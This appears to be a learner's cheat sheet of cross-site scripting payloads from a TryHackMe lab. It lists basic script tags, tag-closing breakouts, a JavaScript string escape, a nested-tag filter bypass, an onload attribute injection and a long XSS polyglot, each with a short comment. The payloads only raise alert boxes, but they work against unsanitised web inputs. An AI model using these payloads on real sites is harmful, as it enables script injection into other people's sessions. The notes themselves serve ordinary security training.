

```javascript
<script>alert('THM');</script> 
```

`// Checking for XSS Vulnerability`



```javascript
"><script>alert('THM');</script>
```
` // Closing a tag before injecting payload`
```javascript
</textarea><script>alert('THM');</script> 
```
`// Closing a tag before injecting payload`

---
```javascript
';alert('THM');//

```

**NOTE**

The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.

---

```javascript
<sscriptcript>alert('THM');</sscriptcript>
```
`Bypassing the filter`
```javascript
/images/cat.jpg" onload="alert('THM');
```
`Taking advantage of the onload="" attribute of the <img> tag`

### Polyglots

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. 
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
[Ultimate XSS Polygot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

```javascript

```

```javascript

```

```javascript

```

```javascript

```

```javascript

```

```javascript

```